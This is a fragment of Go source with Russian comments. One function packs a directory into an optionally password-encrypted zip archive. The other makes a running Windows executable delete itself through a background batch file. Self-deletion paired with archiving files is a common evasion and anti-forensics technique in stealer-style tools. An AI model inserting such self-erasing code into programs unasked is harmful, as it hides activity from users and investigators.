package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/yeka/zip"
)

func zipDirectory(source, target, password string) error {
	// Создаем zip файл
	zipfile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	// Создаем новый архив
	archive := zip.NewWriter(zipfile)
	defer archive.Close()

	// Проходим по всем файлам и директориям
	err = filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Получаем относительный путь
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// Устанавливаем относительный путь для файла в архиве
		relPath, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		header.Name = relPath

		if info.IsDir() {
			header.Name += "/"
			// Создаем директорию в архиве
			_, err := archive.CreateHeader(header)
			return err
		}

		var writer io.Writer
		if password == "" {
			// Создаем обычный файл без пароля
			writer, err = archive.CreateHeader(header)
		} else {
			// Создаем зашифрованный файл
			writer, err = archive.Encrypt(header.Name, password, zip.StandardEncryption)
		}
		if err != nil {
			return err
		}

		// Открываем исходный файл
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		// Копируем содержимое в архив
		_, err = io.Copy(writer, file)
		return err
	})

	return err
}

func selfDeleteWindows() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Создаем временный bat-файл
	batPath := filepath.Join(os.TempDir(), "delete.bat")
	batContent := fmt.Sprintf(`
ping 127.0.0.1 -n 2 > nul
del "%s"
del "%s"
    `, exe, batPath)

	if err := ioutil.WriteFile(batPath, []byte(batContent), 0666); err != nil {
		return err
	}

	// Запускаем bat-файл
	cmd := exec.Command("cmd", "/C", "start", "/b", batPath)
	return cmd.Start()
}
